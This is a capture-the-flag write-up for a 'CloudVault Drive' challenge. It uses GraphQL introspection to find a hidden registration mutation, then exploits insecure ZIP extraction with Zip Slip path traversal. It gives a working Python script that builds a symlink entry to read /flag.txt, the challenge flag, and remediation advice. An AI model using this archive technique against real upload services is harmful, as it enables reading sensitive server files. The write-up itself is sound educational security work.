
# Writeup: CloudVault Drive Exploitation

**Challenge Description:** A "secure" drive for storing backup files.

**Target:** `http://ctf.vulnbydefault.com:14800/`

**Flag:** `VBD{z1p_sl1p_1s_fun_adb2c482c74dadf66562129c16748893}`

---

## 1. Reconnaissance & Hidden API Discovery

The application appeared to be a standard file storage site. Inspecting the login page source revealed that it communicated with a **GraphQL API** at `/api/graphql`.

By sending an **Introspection Query**, we discovered that the API allowed anyone to register a new user, a feature not linked on the main UI:

Bash

```
# Querying the schema to find mutations
curl -X POST -d '{"query": "{__schema{mutationType{types{name fields{name}}}}"}' ...
```

We registered an account and logged into the dashboard.

---

## 2. Vulnerability Analysis: Insecure ZIP Extraction

The dashboard allowed users to upload `.zip` files. In web applications, ZIP extraction is a high-risk feature often vulnerable to:

1. **Zip Slip (Path Traversal):** Filenames like `../../file.txt` can escape the intended directory.
    
2. **Symlink Following:** If the extractor recreates symbolic links, an attacker can link a file inside the ZIP to a sensitive system file (like `/etc/passwd`).
    

---

## 3. The Exploit Chain

### Phase A: Testing Path Traversal

First, we confirmed the server was vulnerable to **Zip Slip**. We created a ZIP where the internal filename was `../../static/test.txt`.

- **Result:** Navigating to `/static/test.txt` returned our content, confirming we could write files into the web server's public directory.
    

### Phase B: Symbolic Link Attack

Since we could write into `/static/`, we aimed to place a **Symbolic Link** there that pointed to the flag on the server's root filesystem.

To avoid local permission issues on the attacker's machine, we used a Python script to build a "pure" ZIP archive. This script set the `external_attr` to `0o120777 << 16`, which tells the Linux filesystem: _"This is a symbolic link, not a regular file."_

**The Exploit Script:**

Python

```
import zipfile

# Define the target and the traversal path
info = zipfile.ZipInfo('../../static/remote_flag')
# Set Unix attributes for a Symbolic Link
info.create_system = 3 
info.external_attr = 0o120777 << 16 

# Create the ZIP
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(info, '/flag.txt') # The link points to the root flag
```

---

## 4. Execution & Flag Retrieval

1. **Upload:** We uploaded `exploit.zip` via the dashboard.
    
2. **Extraction:** The server extracted the file, saw the `../../static/` path, and created a symbolic link named `remote_flag` inside the web server's static folder.
    
3. **Access:** By visiting the URL directly, the web server followed the link and served the contents of the root `/flag.txt`.
    

**Command:**

`curl http://ctf.vulnbydefault.com:14800/static/remote_flag`

**Flag Found:**

`VBD{z1p_sl1p_1s_fun_adb2c482c74dadf66562129c16748893}`

---

## 5. Remediation

- **Disable Introspection:** GraphQL APIs in production should disable introspection to prevent schema leakage.
    
- **Validate ZIP Paths:** Use libraries that reject filenames containing `..` or absolute paths.
    
- **Sanitize Extractions:** Ensure the extraction utility does not follow or create symbolic links (e.g., use the `nosymlinks` flag or equivalent logic).
    
